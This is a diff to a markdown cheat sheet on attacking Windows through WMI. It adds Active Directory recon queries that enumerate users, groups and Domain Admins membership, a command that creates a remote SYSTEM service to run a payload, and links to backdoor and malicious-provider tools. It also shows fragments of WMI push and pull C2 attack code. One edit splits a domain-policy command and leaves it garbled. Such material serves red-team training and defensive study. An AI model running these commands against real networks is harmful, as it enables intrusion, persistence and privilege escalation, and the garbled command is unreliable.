@@ -24,20 +24,24 @@
   - [Registry key manipulation](#registry-key-manipulation)
   - [Recon and information gathering](#recon-and-information-gathering)
   - [Exploitation](#exploitation)
+  - [Lateral movement](#lateral-movement)
       - [WMI Attacks – C2 Communication (WMI Class) – “Push” Attack](#wmi-attacks--c2-communication-wmi-class--push-attack)
       - [WMI Attacks – C2 Communication (Registry) – “Pull” Attack](#wmi-attacks--c2-communication-registry--pull-attack)
-  - [Malicious WMI providers](#malicious-wmi-providers)
-  - [Persistence using WMI](#persistence-using-wmi)
+      - [Command Execution Win32_Service](#command-execution-win32_service)
+  - [WMI Persistence](#wmi-persistence)
+      - [Malicious WMI providers](#malicious-wmi-providers)
+      - [WMI Backdoor](#wmi-backdoor)
       - [MOF files](#mof-files)
       - [WMI Event Subscriptions](#wmi-event-subscriptions)
-      - [WMI Providers](#wmi-providers)
   - [Resources](#resources)
       - [BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.](#blackhat-us-2015-abusing-wmi-to-built-a-persistent-asyncronous-and-fileless-backdoor)
+      - [WMISploit](#wmisploit)
       - [WMI for Script Kiddies](#wmi-for-script-kiddies)
       - [Usefull WMIC queries for host and domain enumeration](#usefull-wmic-queries-for-host-and-domain-enumeration)
       - [Red Team handbook WMI command](#red-team-handbook-wmi-command)
       - [NoLimitSecu French Podcast dedicated to WMI](#nolimitsecu-french-podcast-dedicated-to-wmi)
       - [Andrei Dumitrescu - OCD](#andrei-dumitrescu---ocd)
+      - [Backdoor with WMI](#backdoor-with-wmi)
 
 - Lateral movement
 - Information gathering
@@ -389,7 +393,10 @@ Get-WmiObject -Namespace root/directory/ldap -Class ds_domain | select -ExpandPr
 
 Get domain policy
 ```
-Get-WmiObject -Namespace root/directory/ldap -Class ds_domain | select DS_lockoutDuration, DS_lockoutObservation, DS_lockoutThreshold, DS_maxPwdAge, DS_minPwdAge, DS_minPwdLength, DS_pwdHistoryLength, DS_pwdProperties
+Get-WmiObject -Namespace root/directory/lda
+Get all domain groups
+```
+```p -Class ds_domain | select DS_lockoutDuration, DS_lockoutObservation, DS_lockoutThreshold, DS_maxPwdAge, DS_minPwdAge, DS_minPwdLength, DS_pwdHistoryLength, DS_pwdProperties
 ```
 
 Retrieve all member computers and filter only for the Domain Controller
@@ -397,19 +404,32 @@ Retrieve all member computers and filter only for the Domain Controller
 Get-WmiObject -Namespace root/directory/ldap -Class ds_computer | Where-Object {$_.ds_userAccountControl -eq 532480} | select ds_cn
 ```
 
-Get all domain users
+Get all domain users/groups
 ```
 Get-WmiObject -Class win32_useraccount
+Get-WmiObject -Class win32_group
 ```
 
-Get names of all domain users
+Get names of all domain users and groups
 ```
 Get-WmiObject -Class win32_useraccount | select name
+Get-WmiObject -Class win32_GroupInDomain | Foreach-Object {[wmi]$_.PartComponent}
 ```
 
-Get all domain users of another domain with trust relationship
+Get all domain users/groups of another domain with trust relationship
 ```
 Get-WmiObject -Class win32_useraccount -Filter "Domain = 'childone'"
+Get-WmiObject -Class win32_GroupInDomain | Where-Object {$_.GroupComponent -match "childone"} | Foreach-Object {[wmi]$_.PartComponent}
+```
+
+Get group membership of the domain admins group for the current and all trusted domains
+```
+Get-WmiObject -Class Win32_GroupUser | Where-Object {$_.GroupComponent -match "Domain Admins"} | Foreach-Object {[wmi]$_.PartComponent}
+```
+
+Get group membership for specific user
+```
+Get-WmiObject win32_GroupUser | Where-Object { $_.PartComponent -match "admin"} | Foreach-Object {[wmi]$_.GroupComponent}
 ```
 
 ## WMI Methods
@@ -632,7 +652,11 @@ cmd /c mklink /d C:\shadowcopy "$link"
 Extracts and decrypts saved session information for software typically used to access Unix systems. [Invoke-SessionGopher.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1)
 
 
+## Lateral movement
+
 #### WMI Attacks – C2 Communication (WMI Class) – “Push” Attack
+- https://github.com/mattifestation/WMI_Backdoor
+  
 **First Step** - Push file contents to remote WMI repository
 ```
 # Prep file to drop on remote system
@@ -675,6 +699,7 @@ Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $Po
 Get-WmiObject @CommonArgs -Class CIM_DataFile -Filter 'Name = "C:\\reconstructedMaliciousFile.exe"'
 ```
 
+
 #### WMI Attacks – C2 Communication (Registry) – “Pull” Attack
 **First Step** - Registry Key creation
 ```
@@ -710,10 +735,28 @@ $DeserializedOutput =
 romBase64String($EncodedOutput)))
 ```
 
-## Malicious WMI providers
 
 
-## Persistence using WMI
+#### Command Execution Win32_Service
+We can create a service on a remote machine using WMI to execute commands and scripts.  
+```
+$SericeType = [byte] 16
+$ErrorControl = [byte] 1
+
+Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false, "Windows Performance", $ErrorControl, $null, $null, "WinPerf", "C:\Windows\System32\calc.exe", $null, $ServiceType, "Manual", "NT AUTHORITY\SYSTEM", ""
+```
+
+
+
+## WMI Persistence
+#### Malicious WMI providers
+- https://gist.github.com/TheWover/4272ea5829d7f6b22fadaeb8aee3229a
+- https://gist.github.com/nicholasmckinney/6309dbd6d3a1aed04f1350e1a685916d
+- https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider
+
+#### WMI Backdoor
+- https://github.com/mattifestation/WMI_Backdoor
+
 #### MOF files
 The list of MOF files for autorecovery is stored here :
 - ```HKLM\SOFTWARE\Microsoft\WBEM\CIMOM\Autorecover MOFs```
@@ -721,13 +764,18 @@ The list of MOF files for autorecovery is stored here :
 
 #### WMI Event Subscriptions
 
-#### WMI Providers
+
+
+
 
 
 ## Resources
 #### BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.  
 - https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
 - https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEF%20CON%2023%20-%20Ballenthin-Graeber-Teodorescu-WMI-Attacks-Defense-Forensics.pdf
+
+#### WMISploit
+- https://github.com/secabstraction/WmiSploit
 
 #### WMI for Script Kiddies  
 - https://www.trustedsec.com/blog/wmi-for-script-kiddies/
@@ -743,3 +791,6 @@ The list of MOF files for autorecovery is stored here :
 
 #### Andrei Dumitrescu - OCD
 - https://raw.githubusercontent.com/Orange-Cyberdefense/cme-wmi/master/slides/WMI-Attacks_From_Theory2Practice.pdf
+
+#### Backdoor with WMI
+- https://www.sakshamdixit.com/backdoor-with-wmi/
